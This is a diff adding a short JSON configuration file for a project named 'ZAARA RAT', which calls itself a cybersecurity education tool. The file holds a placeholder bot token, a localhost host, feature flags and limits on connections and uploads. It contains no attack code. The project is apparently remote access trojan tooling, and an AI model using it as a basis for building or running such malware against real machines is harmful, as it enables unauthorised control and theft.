@@ -1,0 +1,20 @@
+{
+    "token": "123456789:ABCdefGHIjklMNOpqrsTUVwxyz-EXAMPLE",
+    "id": "123456789",
+    "host": "http://localhost:3000/",
+    "author": "ZAARA",
+    "version": "2.0.0",
+    "project": "ZAARA RAT - Advanced Cybersecurity Education Tool",
+    "features": {
+        "encryption": true,
+        "logging": true,
+        "rateLimiting": true,
+        "sessionManagement": true
+    },
+    "settings": {
+        "maxConnections": 10,
+        "maxUploadSize": 52428800,
+        "sessionTimeout": 3600000,
+        "logLevel": "info"
+    }
+}
